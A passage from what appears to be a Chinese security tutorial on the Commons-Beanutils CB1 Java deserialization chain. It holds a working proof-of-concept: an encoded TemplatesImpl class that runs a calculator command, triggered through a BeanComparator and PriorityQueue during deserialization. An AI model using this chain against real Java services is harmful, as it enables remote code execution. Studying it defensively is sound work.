,<span class="number">68</span> ,</span><br><span class="line">            <span class="number">79</span> ,<span class="number">77</span> ,<span class="number">59</span> ,<span class="number">91</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,</span><br><span class="line">            <span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">109</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">122</span> ,</span><br><span class="line">            <span class="number">101</span> ,<span class="number">114</span> ,<span class="number">47</span> ,<span class="number">83</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">122</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">111</span> ,</span><br><span class="line">            <span class="number">110</span> ,<span class="number">72</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">100</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">59</span> ,<span class="number">41</span> ,<span class="number">86</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">67</span> ,</span><br><span class="line">            <span class="number">111</span> ,<span class="number">100</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">15</span> ,<span class="number">76</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">101</span> ,<span class="number">78</span> ,<span class="number">117</span> ,<span class="number">109</span> ,<span class="number">98</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">114</span> ,<span class="number">84</span> ,<span class="number">97</span> ,<span class="number">98</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">10</span> ,<span class="number">69</span> ,<span class="number">120</span> ,<span class="number">99</span> ,<span class="number">101</span> ,<span class="number">112</span> ,<span class="number">116</span> ,</span><br><span class="line">            <span class="number">105</span> ,<span class="number">111</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">34</span> ,<span class="number">1</span> ,<span class="number">0</span> ,-<span class="number">90</span> ,<span class="number">40</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">120</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">120</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">116</span> ,<span class="number">99</span> ,<span class="number">47</span> ,<span class="number">68</span> ,<span class="number">79</span> ,<span class="number">77</span> ,<span class="number">59</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">120</span> ,<span class="number">109</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">100</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">68</span> ,<span class="number">84</span> ,<span class="number">77</span> ,<span class="number">65</span> ,<span class="number">120</span> ,<span class="number">105</span> ,<span class="number">115</span> ,<span class="number">73</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">59</span> ,<span class="number">76</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,</span><br><span class="line">            <span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">109</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">122</span> ,</span><br><span class="line">            <span class="number">101</span> ,<span class="number">114</span> ,<span class="number">47</span> ,<span class="number">83</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">122</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">111</span> ,</span><br><span class="line">            <span class="number">110</span> ,<span class="number">72</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">100</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">59</span> ,<span class="number">41</span> ,<span class="number">86</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">6</span> ,<span class="number">60</span> ,</span><br><span class="line">            <span class="number">105</span> ,<span class="number">110</span> ,<span class="number">105</span> ,<span class="number">116</span> ,<span class="number">62</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">3</span> ,<span class="number">40</span> ,<span class="number">41</span> ,<span class="number">86</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">35</span> ,<span class="number">1</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">10</span> ,<span class="number">83</span> ,<span class="number">111</span> ,<span class="number">117</span> ,<span class="number">114</span> ,<span class="number">99</span> ,<span class="number">101</span> ,<span class="number">70</span> ,<span class="number">105</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">23</span> ,</span><br><span class="line">            <span class="number">72</span> ,<span class="number">101</span> ,<span class="number">108</span> ,<span class="number">108</span> ,<span class="number">111</span> ,<span class="number">84</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">115</span> ,<span class="number">73</span> ,</span><br><span class="line">            <span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">46</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">17</span> ,<span class="number">0</span> ,<span class="number">18</span> ,<span class="number">7</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">36</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">37</span> ,<span class="number">0</span> ,<span class="number">38</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">40</span> ,<span class="number">111</span> ,<span class="number">112</span> ,<span class="number">101</span> ,<span class="number">110</span> ,<span class="number">32</span> ,<span class="number">47</span> ,</span><br><span class="line">            <span class="number">83</span> ,<span class="number">121</span> ,<span class="number">115</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">65</span> ,<span class="number">112</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">105</span> ,<span class="number">99</span> ,<span class="number">97</span> ,<span class="number">116</span> ,</span><br><span class="line">            <span class="number">105</span> ,<span class="number">111</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">47</span> ,<span class="number">67</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">99</span> ,<span class="number">117</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">111</span> ,<span class="number">114</span> ,</span><br><span class="line">            <span class="number">46</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">112</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">39</span> ,<span class="number">0</span> ,<span class="number">40</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">41</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">42</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">43</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">19</span> ,<span class="number">72</span> ,<span class="number">101</span> ,<span class="number">108</span> ,<span class="number">108</span> ,<span class="number">111</span> ,<span class="number">32</span> ,<span class="number">84</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">112</span> ,</span><br><span class="line">            <span class="number">108</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">115</span> ,<span class="number">73</span> ,<span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">7</span> ,<span class="number">0</span> ,<span class="number">44</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">45</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">46</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">28</span> ,<span class="number">121</span> ,<span class="number">115</span> ,<span class="number">111</span> ,<span class="number">115</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,</span><br><span class="line">            <span class="number">72</span> ,<span class="number">101</span> ,<span class="number">108</span> ,<span class="number">108</span> ,<span class="number">111</span> ,<span class="number">84</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">115</span> ,<span class="number">73</span> ,</span><br><span class="line">            <span class="number">109</span> ,<span class="number">112</span> ,<span class="number">108</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">64</span> ,<span class="number">99</span> ,<span class="number">111</span> ,<span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,</span><br><span class="line">            <span class="number">114</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">116</span> ,<span class="number">99</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">114</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">109</span> ,<span class="number">101</span> ,<span class="number">47</span> ,<span class="number">65</span> ,<span class="number">98</span> ,<span class="number">115</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">99</span> ,<span class="number">116</span> ,<span class="number">84</span> ,<span class="number">114</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">101</span> ,<span class="number">116</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">57</span> ,<span class="number">99</span> ,<span class="number">111</span> ,</span><br><span class="line">            <span class="number">109</span> ,<span class="number">47</span> ,<span class="number">115</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">111</span> ,<span class="number">114</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">97</span> ,<span class="number">112</span> ,<span class="number">97</span> ,<span class="number">99</span> ,<span class="number">104</span> ,</span><br><span class="line">            <span class="number">101</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">97</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">114</span> ,<span class="number">110</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">108</span> ,<span class="number">47</span> ,<span class="number">120</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">116</span> ,<span class="number">99</span> ,<span class="number">47</span> ,<span class="number">84</span> ,<span class="number">114</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">115</span> ,<span class="number">108</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">116</span> ,<span class="number">69</span> ,<span class="number">120</span> ,<span class="number">99</span> ,<span class="number">101</span> ,<span class="number">112</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">111</span> ,<span class="number">110</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">19</span> ,<span class="number">106</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">69</span> ,<span class="number">120</span> ,<span class="number">99</span> ,<span class="number">101</span> ,<span class="number">112</span> ,<span class="number">116</span> ,<span class="number">105</span> ,</span><br><span class="line">            <span class="number">111</span> ,<span class="number">110</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">17</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,</span><br><span class="line">            <span class="number">82</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">109</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">10</span> ,<span class="number">103</span> ,<span class="number">101</span> ,<span class="number">116</span> ,<span class="number">82</span> ,<span class="number">117</span> ,</span><br><span class="line">            <span class="number">110</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">109</span> ,<span class="number">101</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">21</span> ,<span class="number">40</span> ,<span class="number">41</span> ,<span class="number">76</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">82</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">105</span> ,<span class="number">109</span> ,<span class="number">101</span> ,<span class="number">59</span> ,<span class="number">1</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">4</span> ,<span class="number">101</span> ,<span class="number">120</span> ,<span class="number">101</span> ,<span class="number">99</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">39</span> ,<span class="number">40</span> ,<span class="number">76</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">83</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">59</span> ,<span class="number">41</span> ,<span class="number">76</span> ,</span><br><span class="line">            <span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">80</span> ,<span class="number">114</span> ,<span class="number">111</span> ,<span class="number">99</span> ,<span class="number">101</span> ,</span><br><span class="line">            <span class="number">115</span> ,<span class="number">115</span> ,<span class="number">59</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">16</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,</span><br><span class="line">            <span class="number">47</span> ,<span class="number">83</span> ,<span class="number">121</span> ,<span class="number">115</span> ,<span class="number">116</span> ,<span class="number">101</span> ,<span class="number">109</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">3</span> ,<span class="number">111</span> ,<span class="number">117</span> ,<span class="number">116</span> ,<span class="number">1</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">21</span> ,<span class="number">76</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">105</span> ,<span class="number">111</span> ,<span class="number">47</span> ,<span class="number">80</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,</span><br><span class="line">            <span class="number">83</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">101</span> ,<span class="number">97</span> ,<span class="number">109</span> ,<span class="number">59</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">19</span> ,<span class="number">106</span> ,<span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,</span><br><span class="line">            <span class="number">105</span> ,<span class="number">111</span> ,<span class="number">47</span> ,<span class="number">80</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">83</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">101</span> ,<span class="number">97</span> ,<span class="number">109</span> ,<span class="number">1</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">7</span> ,<span class="number">112</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">108</span> ,<span class="number">110</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">21</span> ,<span class="number">40</span> ,<span class="number">76</span> ,<span class="number">106</span> ,</span><br><span class="line">            <span class="number">97</span> ,<span class="number">118</span> ,<span class="number">97</span> ,<span class="number">47</span> ,<span class="number">108</span> ,<span class="number">97</span> ,<span class="number">110</span> ,<span class="number">103</span> ,<span class="number">47</span> ,<span class="number">83</span> ,<span class="number">116</span> ,<span class="number">114</span> ,<span class="number">105</span> ,<span class="number">110</span> ,<span class="number">103</span> ,</span><br><span class="line">            <span class="number">59</span> ,<span class="number">41</span> ,<span class="number">86</span> ,<span class="number">0</span> ,<span class="number">33</span> ,<span class="number">0</span> ,<span class="number">8</span> ,<span class="number">0</span> ,<span class="number">9</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">3</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">11</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">25</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">0</span> ,<span class="number">3</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,-<span class="number">79</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">13</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">0</span> ,<span class="number">6</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">14</span> ,<span class="number">0</span> ,<span class="number">14</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">4</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">15</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">10</span> ,<span class="number">0</span> ,<span class="number">16</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">12</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">0</span> ,<span class="number">25</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,-<span class="number">79</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">1</span> ,<span class="number">0</span> ,<span class="number">13</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">6</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">16</span> ,<span class="number">0</span> ,<span class="number">14</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">15</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">17</span> ,<span class="number">0</span> ,<span class="number">18</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">2</span> ,<span class="number">0</span> ,<span class="number">12</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">58</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">22</span> ,</span><br><span class="line">            <span class="number">42</span> ,-<span class="number">73</span> ,<span class="number">0</span> ,<span class="number">1</span> ,-<span class="number">72</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">18</span> ,<span class="number">3</span> ,-<span class="number">74</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">76</span> ,-<span class="number">78</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">5</span> ,<span class="number">18</span> ,<span class="number">6</span> ,-<span class="number">74</span> ,<span class="number">0</span> ,<span class="number">7</span> ,-<span class="number">79</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">13</span> ,<span class="number">0</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">18</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">18</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">19</span> ,<span class="number">0</span> ,<span class="number">13</span> ,<span class="number">0</span> ,</span><br><span class="line">            <span class="number">20</span> ,<span class="number">0</span> ,<span class="number">21</span> ,<span class="number">0</span> ,<span class="number">21</span> ,<span class="number">0</span> ,<span class="number">14</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">4</span> ,<span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">19</span> ,</span><br><span class="line">            <span class="number">0</span> ,<span class="number">1</span> ,<span class="number">0</span> ,<span class="number">20</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">0</span> ,<span class="number">2</span> ,<span class="number">0</span> ,<span class="number">21</span> ,&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;testClassBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        PropertyUtils.getProperty(obj,&quot;getOutputProperties&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        obj.getOutputProperties();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();<span class="comment">//为空，否则add时会调用getter方法。</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">3</span>, beanComparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);<span class="comment">//替换为执行字节码的getter</span></span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj,<span class="number">1</span>&#125;);<span class="comment">//必须，不替换queue为数字，无法调用outputProperties</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="无依赖CB1链"><a href="#无依赖CB1链" class="headerlink" title="无依赖CB1链"></a>无依赖CB1链</h3><p>因为BeanComparator的构造函数说明，如果没有指定Comparator，那么默认使用ComparableComparator.getInstance()。</p>
